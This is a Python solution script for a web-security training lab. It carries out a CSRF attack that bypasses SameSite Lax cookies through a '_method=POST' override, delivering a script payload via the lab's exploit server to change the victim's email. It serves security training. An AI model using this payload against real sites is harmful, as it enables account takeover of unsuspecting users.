##############################################################################
#
# Lab: SameSite Lax bypass via method override
#
# Hack Steps: 
#      1. Make the request to change the email using the GET method 
#         and include an additional URL parameter to override the method
#      2. Deliver the exploit to the victim
#      3. The victim's email will be changed after they trigger the exploit
#
##############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a8600ce037876af8182a75d0038004f.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a1d00d603be766381b3a68001ed0037.exploit-server.net"

def main():
    new_email = "hacked@you.com" # You can change this to what you want
    payload = f"""<script>
                    location = "{LAB_URL}/my-account/change-email?email={new_email}&_method=POST"
                </script>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data):
    try:    
        return requests.post(url, data)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()